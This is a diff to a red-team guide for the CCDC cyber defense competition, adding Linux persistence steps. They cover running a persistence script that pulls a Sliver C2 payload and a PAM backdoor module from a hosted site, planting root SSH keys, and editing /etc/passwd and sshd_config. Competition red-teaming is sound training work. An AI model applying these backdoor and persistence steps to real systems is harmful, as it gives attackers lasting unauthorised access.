@@ -52,8 +52,9 @@ pagetitle: Red Teaming for CCDC
 
 **Linux:**
 - Run [linux_persistence.sh {ip}:{port} {sliver_payload_file} {pam_so_file}](https://khaelkugler.com/scripts/linux_persistence.sh.txt) while hosting the payload
-  - Make sure to point the script to the correct location to pull the files from
-    - Also make sure that 
+  - Make sure to point the script to the correct location to pull both files from
+    - Make sure to generate sliver payloads beforehand
+    - [PAM backdoor binary](https://khaelkugler.com/scripts/pam_login.so) can be downloaded from `https://khaelkugler.com/scripts/pam_login.so`
 - Add SSH keys
   - `mkdir /root/.ssh` and add key to `/root/.ssh/authorized_keys`
 - Modify `/etc/passwd` and `/etc/ssh/sshd_config`
